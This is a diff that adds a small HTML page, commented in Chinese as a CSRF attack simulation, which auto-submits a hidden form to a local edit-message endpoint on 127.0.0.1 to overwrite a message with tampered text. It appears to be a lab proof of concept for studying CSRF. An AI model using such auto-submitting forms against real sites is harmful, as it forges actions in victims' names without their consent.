@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF 攻击模拟 - 编辑消息</title>
+</head>
+<body>
+    <!-- 构造一个自动提交的表单，目标 URL 指向编辑消息的接口 -->
+    <form id="csrfForm" action="http://127.0.0.1:5000/edit_message/10" method="POST">
+        <!-- 这里通过隐藏域提交新的消息内容 -->
+        <input type="hidden" name="content" value="这条消息已被篡改！">
+    </form>
+    <script>
+        // 页面加载后自动提交表单
+        document.getElementById('csrfForm').submit();
+    </script>
+    <p>如果表单没有自动提交，请点击下面的按钮：</p>
+    <button onclick="document.getElementById('csrfForm').submit();">提交</button>
+</body>
+</html>
+
